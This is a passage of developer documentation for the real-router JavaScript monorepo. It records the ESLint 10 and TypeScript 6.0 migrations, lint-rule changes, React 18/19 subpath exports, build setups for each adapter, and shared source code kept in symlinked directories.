**GPL allowance:** GPL licenses are allowed for devDependencies only (build tools like `rollup-plugin-dts`). They don't link with production code, so no copyleft concern.

**OpenSSF Scorecard:** `warn-on-openssf-scorecard-level: 0` — warns on low-scored packages instead of failing. Specific GHSAs can be allowed via `allow-ghsas` when a vulnerability is assessed as non-applicable.

## ESLint 10 Migration

### Overview

Migrated from ESLint 9.39 to ESLint 10.x (currently 10.2.1). Tracking issue: [#237](https://github.com/greydragon888/real-router/issues/237).

### Package Changes

| Package                         | Before | After       | Notes                                            |
| ------------------------------- | ------ | ----------- | ------------------------------------------------ |
| `eslint`                        | 9.39.2 | 10.1.0      | Major upgrade                                    |
| `@eslint/js`                    | 9.39.2 | 10.0.1      | Major upgrade                                    |
| `@eslint-react/eslint-plugin`   | 2.13.0 | 4.2.1       | v3: absorbs react-hooks; v4: JSX rules split out |
| `eslint-plugin-react-jsx`       | —      | 4.2.1       | New: JSX-specific rules (split from react-x)     |
| `typescript-eslint`             | 8.53.1 | 8.58.0      | Minor                                            |
| `@stylistic/eslint-plugin`      | 5.7.1  | 5.10.0      | Minor                                            |
| `eslint-plugin-import-x`        | 4.16.1 | 4.16.2      | Patch                                            |
| `eslint-plugin-unicorn`         | 62.0.0 | 64.0.0      | 2 major versions, 5 new rules                    |
| `eslint-plugin-sonarjs`         | 3.0.5  | 4.0.2       | Major — ESLint 10 support                        |
| `eslint-plugin-jsdoc`           | 62.4.1 | 62.9.0      | Minor                                            |
| `eslint-plugin-testing-library` | 7.15.4 | 7.16.2      | Patch                                            |
| `@vitest/eslint-plugin`         | 1.6.12 | 1.6.13      | Patch                                            |
| `eslint-plugin-promise`         | 7.2.1  | **Removed** | Covered by typescript-eslint                     |
| `eslint-plugin-react-hooks`     | 7.0.1  | **Removed** | Absorbed by @eslint-react v3                     |

### eslint-plugin-promise Removal

All critical promise rules were already covered by `typescript-eslint strictTypeChecked`:

| promise rule              | typescript-eslint replacement             |
| ------------------------- | ----------------------------------------- |
| `promise/always-return`   | `@typescript-eslint/no-floating-promises` |
| `promise/catch-or-return` | `@typescript-eslint/no-floating-promises` |
| `promise/no-return-wrap`  | `@typescript-eslint/no-misused-promises`  |

### @eslint-react v3 Migration (replaces eslint-plugin-react-hooks)

**Problem:** `eslint-plugin-react-hooks` 7.0.1 did not declare ESLint 10 in peer deps ([facebook/react#35758](https://github.com/facebook/react/issues/35758)).

**Solution:** `@eslint-react/eslint-plugin` v3.0.0 absorbed `rules-of-hooks` and `exhaustive-deps` (ported verbatim from react-hooks). This eliminated the need for a separate plugin.

**Breaking changes applied:**

- Removed rules now native to ESLint 10: `jsx-uses-vars`, `jsx-uses-react`, `jsx-no-undef`
- Renamed: `react-hooks/exhaustive-deps` → `@eslint-react/exhaustive-deps` in eslint-disable comments
- `eslint-plugin-react-hooks-extra` merged into `react-x` namespace
- Preact adapter uses `@eslint-react` v3 with `settings["react-x"].importSource: "preact"`

**Node.js requirement:** v3.0.0 requires Node >=22.0.0. Acceptable because real-router is a client-side library — Node version only constrains dev tooling.

### eslint-plugin-sonarjs v4 Migration

**Problem:** Old GitHub repo (`SonarSource/eslint-plugin-sonarjs`) was archived. Appeared abandoned.

**Solution:** Development moved to [`SonarSource/SonarJS`](https://github.com/SonarSource/SonarJS) monorepo. v4.0.0 added ESLint 10 support. [CHANGELOG](https://github.com/SonarSource/SonarJS/blob/master/packages/analysis/src/jsts/rules/CHANGELOG.md) is public.

**Removed rules:** `enforce-trailing-comma` (covered by `@stylistic/comma-dangle`), `super-invocation` (covered by ESLint core `constructor-super`).

**New security rules (recommended):** `hardcoded-secret-signatures`, `dynamically-constructed-templates`, `review-blockchain-mnemonic`, `no-session-cookies-on-static-assets`. Last two disabled as irrelevant for client-side router.

### ESLint 10.4 — `includeIgnoreFile()` for `.gitignore` parity

**Problem.** Our `globalIgnores([...])` list in `eslint.config.mjs` partially duplicated `.gitignore` (build artifacts, coverage, `.turbo`, etc.) and partially diverged (extra entries like `**/*.bak*`, `cz.config.js`). Maintaining two lists invited drift — when CI added `.angular/`, `.svelte-kit/`, `playwright-report/`, `tools/`, `.spike/`, `**/CLAUDE.md` to `.gitignore`, none of those landed in `globalIgnores`. ESLint still skipped them in practice (no `.ts`/`.tsx` files inside) but the defence-in-depth was theoretical.

**Solution (ESLint 10.4+).** `eslint/config` ships `includeIgnoreFile(absolutePath, label?)` — an official helper that reads `.gitignore`-style patterns and converts them into a flat-config ignore block. We prepend it to the config array and trim the manually-maintained list to entries that are NOT in `.gitignore`:

```js
import { fileURLToPath } from "node:url";
import path from "node:path";
import { globalIgnores, includeIgnoreFile } from "eslint/config";

const gitignorePath = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  ".gitignore",
);

export default tsEslint.config(
  includeIgnoreFile(gitignorePath, "Imported .gitignore patterns"),
  globalIgnores([
    "**/*.min.js",
    "**/*.d.ts",
    "**/generated/**",
    "**/*.bak*",        // Backup files
    "**/*.mjs",         // JS config files
    "cz.config.js",
    ".changeset/**",
    "**/e2e/**",
  ]),
  // ...
);
```

After the swap, `globalIgnores` carries only the ESLint-specific exclusions that `.gitignore` legitimately doesn't (mjs configs, e2e tests, generated dirs, backup files). Build artifacts, coverage, `.turbo`, `.stryker-tmp`, `node_modules`, framework outputs, AI tooling dirs — all flow from `.gitignore` automatically and stay in lockstep.

### Adapter Config Cleanup (~2,000 lines removed)

**Problem:** Each adapter config (React, Preact, Vue, Solid, Svelte) duplicated ~250-300 lines of rules already covered by the root config: TypeScript, JSDoc, Unicorn, Promise, SonarJS, Prettier, Vitest, no-only-tests.

**Root cause:** Root config targets `**/*.ts` and `**/*.tsx`. Adapters extend root via `...eslintConfig`. All root rules already apply to adapter files.

**Solution:** Stripped all duplicated blocks. Each adapter now contains only framework-specific configuration:

| Adapter | Before    | After    | Content                                                  |
| ------- | --------- | -------- | -------------------------------------------------------- |
| React   | 556 lines | 82 lines | `@eslint-react` v3 + testing-library/react               |
| Preact  | 442 lines | 68 lines | `@eslint-react` v3 (Preact source) + testing-library/dom |
| Vue     | 419 lines | 22 lines | testing-library/dom (no .vue files)                      |
| Solid   | 410 lines | 22 lines | testing-library/dom (no solid plugin — dormant project)  |
| Svelte  | 442 lines | 55 lines | eslint-plugin-svelte + testing-library/dom               |

### eslint-plugin-solid — Not Added

Evaluated `eslint-plugin-solid@0.14.5` for the Solid adapter. Decision: not added.

- Project dormant (last release Dec 2024, maintainer inactive on the project)
- Does not declare ESLint 10 support (works at runtime but no guarantee)
- No alternatives exist (checked npm, GitHub, Solid.js org)
- Solid adapter is 804 lines with 100% test coverage — all Solid patterns are correct (`props.xxx` everywhere, no destructuring, correct `splitProps` usage). The plugin's key rules target mistakes not present in the codebase.

### typescript-eslint transitive pin saga (8.57.1 → removed 2026-05-19)

**Historical context.** `typescript-eslint@8.57.2` introduced a fixer crash in `no-unnecessary-type-arguments`. The rule's `fix()` function accessed `typeArguments.params[-1]` → `undefined` → crash on `.range`. Occurred on both ESLint 9 and 10, even without `--fix`. Bisected: 8.57.1 OK → 8.57.2 CRASH. For roughly two months the main `typescript-eslint` umbrella package moved forward (eventually to `8.59.0`) while `pnpm.overrides` pinned the transitive `@typescript-eslint/eslint-plugin` and `@typescript-eslint/parser` to `8.57.1` to avoid the crashing code path.

**Why the pin became a suppressor, not a workaround.** The original crash was fixed upstream by 8.59.0 (verified 2026-05-18), but the pin had silently transitioned into an implicit suppressor for newer typescript-eslint rules introduced between 8.58 and 8.59 — `no-base-to-string`, `no-unnecessary-condition`, `prefer-promise-reject-errors` — plus `@typescript-eslint/no-unnecessary-type-assertion` got noticeably stricter. The pin no longer paid for itself: keeping it meant `pnpm lint:dedupe` failed on every dependabot bump of `typescript-eslint` (transitive `@typescript-eslint/tsconfig-utils`/`types` resolved to the new version, but the pinned umbrella stayed on 8.57.1, breaking pnpm's strict dedupe). Each bump arrived as a CI red and had to be closed by hand.

**Removal (commits `a35dcb60`, `53bfb92e`, `42215b52`).** The pin came off in three logical steps:

1. **Drop the pin from `pnpm.overrides`** + reinstall to let the umbrella pull the matching transitive versions. `pnpm lint:dedupe` immediately turned green for dependabot bumps.
2. **Lift the suppression debt explicitly.** 10 `eslint-disable-next-line` markers + 1 file-level disable, each with an inline `-- reason` comment so a future audit can decide whether to refactor or keep:
   - `@typescript-eslint/no-base-to-string` × 4 — `String(value)` on `unknown`-typed route params (`path-matcher` source + test helpers). Route params are contractually primitive (`string | number | boolean | bigint`) but typed `unknown` — refactor would mean throwing on Symbol/Function values, a runtime semantics change.
   - `@typescript-eslint/prefer-promise-reject-errors` × 3 — `Promise.reject(error)` from `NavigationNamespace` catch blocks. Wrapping in `error instanceof Error ? error : new Error(...)` brings a defensive untestable branch (RouterError extends Error, the else is unreachable) which breaks the 100% branch-coverage gate; `error as Error` gets reverted by `--fix` as an "unnecessary assertion". The disable is the residual fixed point.
   - `@typescript-eslint/no-unnecessary-condition` × 2 — `decoder(params) ?? params` / `encoder(params) ?? params` runtime fallbacks in `getRoutesApi.ts`. The `??` guards against a user-provided callback violating its declared return type — removing it would require changing the public API signature to `(p) => Params | null | undefined`.
   - `sonarjs/no-undefined-argument` (file-level, 7 occurrences) — `tests/.../edge-cases-callback.test.ts` exists specifically to lock the navigate-with-trailing-`undefined` behaviour for Issues #53/#58. Stripping the trailing `undefined` defeats the tests.
   - Three structural cleanups avoided disables entirely: `Record<string | symbol, unknown>` in two `shallowEqual.properties.ts` files (preact + svelte) lets symbol-keyed writes type-check without a cast, and `react-server-entry.test.ts` swapped string-indexing-via-cast for the `in` operator.
3. **Eat the `--fix` collateral on the rest.** 103 source/test files had redundant `as X` casts removed by `eslint --fix` once the stricter `no-unnecessary-type-assertion` came online. Three of those casts were load-bearing and re-introduced with a targeted disable: `preact/tests/property/shallowEqual.properties.ts:337-338` (symbol-index on `Record<string, unknown>` — `TS2538`), `svelte/tests/property/shallowEqual.properties.ts:460` (same shape via `buildLargeRecord`'s return type), and `react/tests/functional/react-server-entry.test.ts:34` (typed namespace import widened to `Record<string, unknown>` for dynamic key access — `TS7053`). The remaining 100 cast removals are pure cleanup, no runtime impact (type assertions are compile-time only).

**Audit workflow for future strictness bumps.** When `pnpm build` fails after a typescript-eslint major:

1. Run `pnpm lint` to surface the manual errors. They will be a small set (`<20` typical).
2. Run once more with `eslint --fix` enabled (already the default in our `lint` script) to absorb the auto-fixable rewrites.
3. Run `pnpm type-check` — every `TS2538`/`TS7053`/`TS2322` from the `--fix` pass is a load-bearing cast that was wrongly removed. Re-introduce each with `// eslint-disable-next-line @typescript-eslint/no-unnecessary-type-assertion -- <load-bearing reason>`. The fixed point converges in 2–3 passes.

**Lesson.** A `pnpm.overrides` pin is the right tool for a confirmed upstream bug with a known fix-version ETA. It is the **wrong** tool for "this newer rule annoys me" — that's a config-level decision and belongs in `eslint.config.mjs`, not in dependency overrides. Once a pin starts suppressing things it wasn't installed to suppress, the cost of keeping it grows silently until something forces the audit (in our case, recurring dependabot dedupe failures).

### New Rules Added

**Unicorn v63-v64 (5 rules):**

- `unicorn/isolated-functions` (warn) — functions without `this` should be standalone
- `unicorn/consistent-template-literal-escape` (error) — consistent escaping in template literals
- `unicorn/no-useless-iterator-to-array` (error) — no unnecessary `Iterator#toArray()`
- `unicorn/prefer-simple-condition-first` (warn) — simpler condition first in logical expressions
- `unicorn/switch-case-break-position` (warn) — consistent break position in switch cases

**ESLint 10 recommended changes:**

- `no-useless-assignment` promoted to `error` — kept as `warn` for gradual adoption
- `no-unassigned-vars` added to recommended — disabled for test files (common `let unsubscribe` in describe scope pattern)

### @eslint-react v4 Migration (from v3.0.0)

**v4.0.0 breaking changes applied:**

- Rule prefixes changed: `@eslint-react/dom/<rule>` → `@eslint-react/dom-<rule>` (slash → hyphen). No impact — project didn't use slash-prefixed rules.
- JSX rules (`no-useless-fragment`, `no-children-prop`, `no-comment-textnodes`, `no-key-after-spread`, `no-namespace`) moved to new `eslint-plugin-react-jsx` package. Installed separately.

**New rules enabled:**

| Rule                                  | Severity | Reason                                                                                     |
| ------------------------------------- | -------- | ------------------------------------------------------------------------------------------ |
| `@eslint-react/immutability` ⚗️       | warn     | Catches mutations of props/state — valuable for library code                               |
| `@eslint-react/refs` ⚗️               | warn     | Prevents ref reads/writes during render                                                    |
| `eslint-plugin-react-jsx/recommended` | preset   | JSX-specific rules: `no-key-after-spread`, `no-useless-fragment`, `no-children-prop`, etc. |

**Suppressed (intentional patterns):**

- `RouterErrorBoundary.tsx`: `onErrorRef.current = onError` — "latest ref" pattern for callback sync
- `RouteView.tsx`: `hasBeenActivatedRef.current` — stable Set read for keepAlive tracking

Both experimental rules disabled in test files (intentional anti-patterns).

### ESLint React Plugin Migration (historical)

_Previous migration from eslint-plugin-react v7 to @eslint-react v2. Now superseded by v3/v4 migration above._

**Original preset:** `recommended-type-checked` — disables rules already enforced by TypeScript, adds type-aware rules.

**Gaps:** `react/no-unescaped-entities` has no equivalent — dropped (JSX compiler catches most cases).

## TypeScript 6.0 Migration

### Problem

TypeScript 6.0.2 released 2026-03-23 as the final JS-based compiler before the Go rewrite (TS 7.0). Needed to migrate from TS 5.9.3 to stay on the supported path.

### Solution

Migrated on 2026-03-28. Single config change required:

```json
// tsconfig.json
{
  "compilerOptions": {
    "ignoreDeprecations": "6.0"
  }
}
```

### Why `ignoreDeprecations` Was Removed

tsup 8.5.1 (via rollup-plugin-dts 6.4.1) internally set `baseUrl` when generating `.d.ts` files. `baseUrl` is deprecated in TS 6.0, requiring `"ignoreDeprecations": "6.0"` in tsconfig.json.

**Resolved:** Migration to tsdown eliminated this issue — tsdown uses rolldown-plugin-dts which doesn't set `baseUrl`. The `ignoreDeprecations` setting has been removed from tsconfig.json.

### Pitfall: Stale pnpm Binary Shims

After `pnpm add -Dw typescript@6.0.2`, packages with `rollup-plugin-dts` as a dependency (`solid`, `svelte`, `vue`) retained stale `node_modules/.bin/tsc` shims pointing to `typescript@5.9.3` in the pnpm store — even though the lockfile only referenced 6.0.2. This caused `tsc --noEmit` to run with TS 5.9.3 where `"ignoreDeprecations": "6.0"` is an invalid value.

**Fix:** `rm -rf node_modules && pnpm install` to regenerate all shims.

**Root cause:** pnpm doesn't regenerate binary shims in package-local `node_modules/.bin/` when a workspace root devDependency is updated. The old shim hardcodes the pnpm store path including the version (`typescript@5.9.3`).

### Peer Dependency Warnings

Originally three packages declared `typescript <6.0.0` or `^5.0.0` as peer deps: typescript-eslint, tsconfck (via vite-tsconfig-paths), and svelte2tsx. All work correctly with TS 6.0, but pnpm's strict peer checking fails on install.

**Fix:** `peerDependencyRules.allowedVersions` in root package.json:

```json
"pnpm": {
  "peerDependencyRules": {
    "allowedVersions": {
      "typescript": "6"
    }
  }
}
```

**Progress:** `typescript-eslint` (now `>=4.8.4 <6.1.0`) and `svelte2tsx` (now `^4.9.4 || ^5.0.0 || ^6.0.0`) have updated their peer ranges to include TS 6. The override remains needed solely because of `tsconfck` (still `^5.0.0`, reached transitively through `vite-tsconfig-paths`).

**TODO:** Remove the override once `tsconfck` widens its `typescript` peer range to include 6.x.

### What Did NOT Need Changing

- **No code changes** — zero source files modified
- **`"Bundler"` casing** — TS compiler is case-insensitive for option values; no need to lowercase
- **typescript-eslint** — works with TS 6.0 via `projectService` despite no official support yet ([typescript-eslint#12123](https://github.com/typescript-eslint/typescript-eslint/issues/12123))
- **`noUncheckedSideEffectImports: true`** (new default) — no false positives in the project
- **All explicit tsconfig values** (`strict`, `module`, `target`, `types`) — already set, unaffected by new defaults

## React 18/19 Split via Subpath Exports

### Problem

`@real-router/react` needs to support both React 18 and React 19.2+. React 19.2 stabilized `<Activity>` — new components like `ActivityRouteNode` require React 19.2+. Options considered:

| Approach                                       | Pros                              | Cons                                                   |
| ---------------------------------------------- | --------------------------------- | ------------------------------------------------------ |
| Separate package (`@real-router/react-legacy`) | Clear separation                  | Duplicated code, double maintenance, double versioning |
| Runtime version checks                         | Single package                    | Bundle bloat, complexity, fragile                      |
| **Subpath exports**                            | Single package, zero runtime cost | Slightly more complex `exports` field                  |

### Solution

Subpath exports: `@real-router/react` (React 19.2+) and `@real-router/react/legacy` (React 18+).

```jsonc
// package.json
{
  "exports": {
    ".": {
      /* main entry — full API */
    },
    "./legacy": {
      /* legacy entry — without React 19.2-only components */
    },
  },
}
```

### Architecture

Flat structure — all shared code in `src/`. The `modern/` subfolder holds React 19.2-only components. Entry points are pure re-export files:

- `src/index.ts` — all exports (shared + modern)
- `src/legacy.ts` — shared exports only (no modern)

No barrel files — both entry points use explicit imports. No code duplication.

### Build

`tsdown.config.mts` uses multi-entry to produce shared chunks:

```ts
export default createIsomorphicConfig({
  custom: {
    entry: {
      index: "src/index.ts",
      legacy: "src/legacy.ts",
    },
  },
});
```

tsdown generates a shared chunk for code common to both entries — no duplication in the output.

### Key Decision: `useContext` vs `use()`

`use()` (React 19) and `useContext` are functionally identical for unconditional context reads. Hooks always call unconditionally, no try/catch or conditional blocks. `use()` advantage (conditional reads) is unused. Therefore `useContext` + `<Context.Provider value>` is the target for shared code — works in React 18 and 19 identically.

`modern/` is reserved exclusively for components that require React 19.2-only APIs (`<Activity>`), not for hooks.

### Testing Strategy

Full test suite runs against the main entry point. Legacy entry gets a single smoke test (export availability, basic render, navigation) — since both entries re-export the same code.

### Details

Architecture and design: [`packages/react/ARCHITECTURE.md`](packages/react/ARCHITECTURE.md)

## Framework Adapter Build Strategies

### Build Tool Per Adapter

| Adapter | Build Tool                  | Reason                                          | Output               |
| ------- | --------------------------- | ----------------------------------------------- | -------------------- |
| React   | tsdown                      | Standard — pure `.tsx`                          | Dual ESM/CJS bundle  |
| Preact  | tsdown                      | Standard — pure `.tsx`                          | Dual ESM/CJS bundle  |
| Solid   | rollup + babel-preset-solid | Solid's JSX needs babel transform               | Dual ESM/CJS bundle  |
| Vue     | tsdown                      | Pure `.ts` with `defineComponent` + `h()`       | Dual ESM/CJS bundle  |
| Svelte  | svelte-package              | `.svelte` and `.svelte.ts` need Svelte compiler | ESM individual files |

### Svelte Package Specifics

`@real-router/svelte` uses `@sveltejs/package` (not tsdown):

- `.svelte` files are copied as-is (consumer's bundler compiles them)
- `.svelte.ts` files are compiled to `.svelte.js` (runes processed)
- `.ts` files are transpiled to `.js`
- ESM only (standard for Svelte ecosystem)
- Type-checking via `svelte-check` (not `tsc`)

### Solid Package Specifics

`@real-router/solid` uses rollup + `babel-preset-solid`:

- Solid's JSX is compiled by babel-preset-solid (not standard JSX transform)
- rollup-plugin-dts for bundled type declarations
- Coverage: `branches: 90` threshold due to babel-generated phantom branches

### Coverage Threshold Exceptions

Framework compilers generate code that v8 coverage tracks but tests can't reach:

| Adapter | Exception                     | Cause                                                   |
| ------- | ----------------------------- | ------------------------------------------------------- |
| Solid   | `branches: 90, functions: 97` | babel-preset-solid phantom branches, `.catch(() => {})` |
| Vue     | `branches: 95, functions: 97` | `defineComponent` internal type guards                  |
| Svelte  | `branches: 96, functions: 93` | Svelte compiler `$derived`/`$props` transforms          |
| React   | None                          | tsdown preserves original code                          |
| Preact  | None                          | tsdown preserves original code                          |

## Shared Sources via Symlinks: `shared/dom-utils/` and `shared/browser-env/` (#437)

### Problem

Two groups of code were shared across multiple packages via full workspace packages:

1. **`dom-utils`** — 5 framework adapters (React, Preact, Solid, Vue, Svelte) needed identical DOM helpers: `shouldNavigate`, `buildHref`, `buildActiveClassName`, `applyLinkA11y`, `createRouteAnnouncer` (WCAG route announcements, #337). ~200 LOC.

2. **`browser-env`** — 3 URL plugins (browser-plugin, hash-plugin, navigation-plugin) needed identical browser API wrappers: History API, popstate handling, SSR fallback, URL parsing, plugin utilities. ~520 LOC.

Original approach (pre-#437): both lived as `"private": true` workspace packages with their own `tsdown.config.mts`, `vitest.config.mts`, `tsconfig.json`, `tsconfig.node.json`, `CLAUDE.md`, `ARCHITECTURE.md`, `README.md`, `INVARIANTS.md`, `CHANGELOG.md`. Bundled into consumers via three different mechanisms: tsdown `alwaysBundle`, rollup `nodeResolve`, and a svelte-specific symlink + `kit.alias` rewrite. Problems:

- Full package infrastructure duplicated for each shared helper (~10 files per package)
- Three different bundling strategies across consumers — fragile (#413 root cause)
- Each consumer had `"dom-utils"` / `"browser-env"` in devDependencies plus bundle-time config
- Turbo cache nodes for `dom-utils:build` and `browser-env:build` — any change invalidated all downstream builds
- Svelte already used a committed symlink workaround for `dom-utils` — the pattern was inconsistent across adapters

### Solution

Source files live in `shared/` at the repo root. Each consumer has a git-tracked symlink inside its `src/` pointing to the corresponding `shared/*` directory. Imports use local-looking relative paths (`from "./dom-utils/index.js"`, `from "../browser-env/index.js"`).

```
shared/
├── package.json                  # Minimal workspace entry: name, type, devDeps on core + type-guards
├── dom-utils/
│   ├── index.ts
│   ├── link-utils.ts
│   └── route-announcer.ts
└── browser-env/
    ├── index.ts
    ├── detect.ts
    ├── history-api.ts
    ├── popstate-handler.ts
    ├── popstate-utils.ts
    ├── safe-browser.ts
    ├── ssr-fallback.ts
    ├── plugin-utils.ts
    ├── url-parsing.ts
    ├── url-utils.ts
    ├── utils.ts
    ├── validation.ts
    └── types.ts

packages/react/src/dom-utils               → ../../../shared/dom-utils      (symlink, git-tracked)
packages/preact/src/dom-utils              → ../../../shared/dom-utils      (symlink)
packages/vue/src/dom-utils                 → ../../../shared/dom-utils      (symlink)
packages/solid/src/dom-utils               → ../../../shared/dom-utils      (symlink)
packages/svelte/src/dom-utils              → ../../../shared/dom-utils      (symlink)
packages/dom-utils/src                     → ../../shared/dom-utils         (tests-only wrapper)

packages/browser-plugin/src/browser-env    → ../../../shared/browser-env    (symlink, git-tracked)
packages/hash-plugin/src/browser-env       → ../../../shared/browser-env    (symlink)
packages/navigation-plugin/src/browser-env → ../../../shared/browser-env    (symlink)
packages/browser-env/src                   → ../../shared/browser-env       (tests-only wrapper)
```

All tooling follows symlinks transparently and sees shared files as if they live locally inside each consumer's `src/`:

- **tsdown** (react, preact, vue, browser-plugin, hash-plugin, navigation-plugin) — follows symlinks, bundles inline. No `alwaysBundle` entry for shared names (relative imports bundle by default). `type-guards` stays in `alwaysBundle` because it's still a real workspace package used by `shared/browser-env`.
- **rollup + babel-preset-solid** (solid) — follows symlinks; `tsconfig.build.json` keeps `rootDir: "./src"` because tsc sees files at their virtual path inside `src/dom-utils/`.
- **svelte-package** (svelte) — follows symlinks, compiles `.svelte.ts` files as local sources. No `kit.alias` needed.

### Minimal `shared/package.json`

`shared/` IS a workspace package, but intentionally minimal: no source files of its own (those live in `dom-utils/` and `browser-env/` subdirs), no build script, no tsdown config, no docs, no tests, no changesets. Only the fields required for transitive dependency resolution:

```json
{
  "name": "@real-router/shared-sources",
  "version": "0.0.0",
  "private": true,
  "type": "commonjs",
  "devDependencies": {
    "@real-router/core": "workspace:*",
    "type-guards": "workspace:*"
  }
}
```

**Why it's a workspace entry at all:** some shared files import `type-guards` (e.g., `shared/browser-env/popstate-utils.ts` uses `isStateStrict`). When rolldown processes these files via a consumer's symlink, the import is transitively listed under `alwaysBundle: ["type-guards"]` in the consumer's tsdown config — meaning rolldown must **resolve and inline** the module. Resolution starts from the file's real filesystem location (`shared/browser-env/*.ts`), walking up through `node_modules` directories. Without `shared/node_modules/type-guards`, rolldown cannot find it and fails with `UNRESOLVED_IMPORT`. Adding `shared/` to `pnpm-workspace.yaml` with `type-guards` as a devDep makes pnpm create the `shared/node_modules/type-guards` symlink, giving rolldown a resolution anchor.

**Why `@real-router/core` is also listed** even though it's a scoped package treated as external by rolldown: for consistency, and so tsc's type resolution sees the same module instance from any location. Prevents subtle dual-package hazards during incremental rebuilds.

**Why `"type": "commonjs"`:** without it, TypeScript walks up to the root `package.json` (`"type": "module"`). Shared files would get ESM type resolution while consumers (all `"type": "commonjs"`) would see CJS types, creating a dual-package hazard where `Router` from `dist/esm/` and `Router` from `dist/cjs/` become nominally different types with conflicting `#private` fields.

**What's deliberately missing:**

- No `main`/`module`/`exports` — not a published package, not imported by name. Consumers reach into `shared/` only through the symlinks.
- No `scripts` — no build, no tests, no lint target. The package is inert from Turbo's perspective.
- No runtime `dependencies` — all deps are devDeps because shared files are inlined into consumers' bundles, not shipped as a separate artifact. Prevents accidental publication of `@real-router/shared-sources` as a real package.

### Scoped vs unscoped dependency resolution (why both cases are needed)

`@real-router/core` and `type-guards` are handled differently by rolldown despite both being workspace packages:

- `@real-router/core` is in each consumer's runtime `dependencies`. rolldown marks it as **external** — the specifier stays in the output bundle as a peer import. No resolution needed at build time.
- `type-guards` is listed in each consumer's `alwaysBundle` tsdown config. rolldown must **resolve and inline** it into the output bundle. Resolution requires `type-guards` to be findable from the importing file's real path via pnpm's `node_modules`.

This asymmetry is why `dom-utils` **appears** to work without workspace deps on `shared/` (its only foreign import is `@real-router/core`, treated as external), but `browser-env` **requires** `type-guards` to be resolvable from `shared/`'s location (inlined). The shared-as-workspace-entry pattern covers both cases uniformly, and is the canonical setup.

### Why each consumer's `src/<shared>` is a symlink (not relative imports)

- **Uniform pattern across all consumers** — previously Svelte was the only package with a symlink. Now every consumer uses the same pattern.
- **Clean local imports** — `from "./browser-env/index.js"` reads as a local directory. No ugly `../../../../shared/browser-env/...` chains.
- **No Solid `rootDir` expansion** — tsc sees the symlinked file at its virtual path (`packages/solid/src/dom-utils/*.ts`), which is inside `rootDir: "./src"`. Accesing via relative path would put files outside rootDir and require widening it (tried in an earlier prototype, rejected).
- **Identical DX across all 8 consumers** — browser-plugin, hash-plugin, navigation-plugin, react, preact, vue, solid, svelte all work the same way.

### `packages/dom-utils/` and `packages/browser-env/` as tests-only wrappers

Both packages are retained as minimal wrappers to host existing tests. Each has:

- `package.json` — minimal: name (kept for backward compat), test scripts, deps on `@real-router/core` and (for browser-env) `type-guards` to satisfy the test runner
- `tsconfig.json` — includes `src` and `tests`
- `vitest.config.mts` + `vitest.config.properties.mts` — existing test runners
- `src` — symlink to `../../shared/<name>` (tests still import via `../../src` unchanged — no test file diff)
- `tests/` — unchanged

Full test migration to a dedicated location (e.g., `tests/shared/`) is a **deferred follow-up**. Doing it now would mean restructuring vitest workspace, turbo tasks, CI configs, and pre-commit hooks — out of scope for #437.

### Windows symlink requirement

Git-tracked symlinks work on Unix/macOS/Linux out of the box. Windows contributors need `git config --global core.symlinks true` plus Developer Mode (or elevated shell). This was already required for Svelte's pre-#437 symlink. #437 scales it from 1 symlink to 10 (5 dom-utils consumers + 3 browser-env consumers + 2 tests-only wrappers). See README "Development" section.

### Tooling configuration

**knip** (`knip.json`):

- Each consumer workspace (8 entries: react, preact, vue, solid, svelte, browser-plugin, hash-plugin, navigation-plugin) lists `"ignore": ["src/dom-utils/**"]` or `"src/browser-env/**"` to skip symlinked directories from dead-code analysis
- `packages/dom-utils` and `packages/browser-env` use tests-only project patterns
- `packages/browser-env` and `packages/navigation-plugin` add `type-guards` to `ignoreDependencies` — knip doesn't see the transitive import through the symlinked `shared/browser-env/popstate-utils.ts` and would otherwise flag it as unused

**jscpd** (`.jscpd.json`): ignores `packages/*/src/dom-utils/**`, `packages/dom-utils/src/**`, `packages/*/src/browser-env/**`, `packages/browser-env/src/**` — without these, jscpd follows symlinks and reports the same shared files as duplicates across every symlinked location.

**vitest coverage**: shared code is tracked by the file's real path (`shared/**/*.ts`), not the symlinked virtual path. The global include pattern `packages/*/src/**/*.ts` does not match `shared/**`, so shared code is currently excluded from per-package 100% coverage enforcement. This is accepted as a trade-off — test migration for shared code is the deferred follow-up.

### History

- **#413** — `dom-utils` as workspace package leaked into published `dependencies`. Fixed by moving to `devDependencies` + tsdown `alwaysBundle`. Smoke test added (`scripts/smoke-test-packages.sh`).
- **#437** (two commits on the same branch):
  - First commit — migrated `dom-utils` from workspace package to `shared/dom-utils/` with symlinks for all 5 framework adapters. Eliminated package infrastructure. Initially used a minimal `shared/package.json` without workspace deps (worked because `@real-router/core` is external-treated, so no resolution was needed).
  - Second commit — migrated `browser-env` the same way for all 3 URL plugins. Hit a `type-guards` resolution failure because `alwaysBundle` requires the package to be resolvable from `shared/`'s physical location, not just marked external. Fix: added `shared/` to `pnpm-workspace.yaml` and put `@real-router/core` + `type-guards` as workspace devDeps. This retroactively became the canonical shape for `shared/package.json` — it's stricter than strictly necessary for `dom-utils` alone, but uniform across both migrations.

## Module Resolution: Clean Exports + Vitest Source Aliases

### History

Originally used manual `paths` in tsconfig → replaced with `customConditions: ["development"]` + `"development"` export condition in all packages. The `"development"` condition pointed to `./src/index.ts` for IDE navigation.

**Problem (#418, #421):** `"development"` is a well-known condition name. Vite (both v7 and v8) resolves it by default in dev mode. External consumers' Vite would resolve to `./src/index.ts`, hitting bare imports of private packages (`dom-utils`, `route-tree`, etc.). Removing `src` from `files` didn't help — Vite errors instead of falling through when a matched condition points to a missing file. Renaming to a custom condition caused dual-package hazard in Vitest.

**Root cause:** Developer-facing configuration (`"development"` condition for IDE navigation) was placed in the consumer-facing contract (`package.json` exports). This polluted exports with infrastructure concerns.

### Current Solution

Clean exports — no `"development"` condition. Same approach as TanStack Router.

**Package.json exports (all packages):**

```json
"exports": {
  ".": {
    "types": { "import": "./dist/esm/index.d.mts", "require": "./dist/cjs/index.d.ts" },
    "import": "./dist/esm/index.mjs",
    "require": "./dist/cjs/index.js"
  }
}
```

**`"files": ["dist", "src"]`** — source shipped for consumer IDE navigation (sourcemaps reference `../../src/` paths) and future declaration maps (#423).

**Vitest source resolution:** `vitest.config.common.mts` has `workspaceSourceAliases()` — auto-generates `resolve.alias` from `packages/*/package.json` at runtime. Maps package names to `src/` entry points so v8 coverage tracks source files. No manual sync — deterministic from package.json. Aliases sorted by key length (longest first) to prevent prefix-match conflicts (`@real-router/core/api` before `@real-router/core`).

